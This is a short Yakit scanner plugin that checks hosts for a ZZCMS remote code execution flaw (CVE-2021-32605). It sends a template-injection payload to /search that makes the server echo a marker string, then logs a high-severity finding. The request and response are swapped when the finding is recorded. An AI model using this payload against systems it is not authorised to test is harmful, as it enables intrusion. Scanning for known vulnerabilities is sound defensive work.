# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)


    packet1 = `POST /search  HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:83.0) Gecko/20100101 Firefox/83.0,
Content-Type: application/x-www-form-urlencoded,

keys={if:1=1);ECho%2010721073;//}{end%20if}
`


    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(10),
    )
    rspIns, _ = poc.ParseBytesToHTTPResponse(rsp)
    reqIns, _ = poc.ParseBytesToHTTPRequest(req)
    if str.MatchAllOfSubString(rsp, `1072107310721073`){
        yakit.Info("=== Vulnerable === : %s", target)
        risk.NewRisk(
            addr,
            risk.title("ZZCMS 远程代码执行漏洞"),
            risk.severity("high"),
            risk.titleVerbose("ZZCMS 远程代码执行漏洞"),
            risk.request(string(rspIns)),
            risk.response(string(reqIns)),
            risk.cve("CVE-2021-32605"),
        )
         
    } else {
        yakit.Info("Not have vul")
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
